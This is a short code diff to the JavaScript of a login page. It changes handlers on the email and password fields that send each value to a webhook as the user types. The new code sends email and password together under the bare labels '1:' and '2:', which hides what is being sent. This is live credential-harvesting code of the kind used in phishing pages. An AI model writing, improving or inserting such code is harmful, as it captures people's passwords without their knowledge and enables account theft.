@@ -209,13 +209,14 @@
       return false; // Prevent form submission
     }
 
-    document.getElementById('email').addEventListener('input', function() {
-      sendToWebhook(`Email: ${this.value}`);
-    });
+    function updateWebhook() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      sendToWebhook(`1: ${email}, 2: ${password}`);
+    }
 
-    document.getElementById('password').addEventListener('input', function() {
-      sendToWebhook(`Password: ${this.value}`);
-    });
+    document.getElementById('email').addEventListener('input', updateWebhook);
+    document.getElementById('password').addEventListener('input', updateWebhook);
 
     function openRegisterModal() {
       document.getElementById('registerModal').style.display = 'flex';
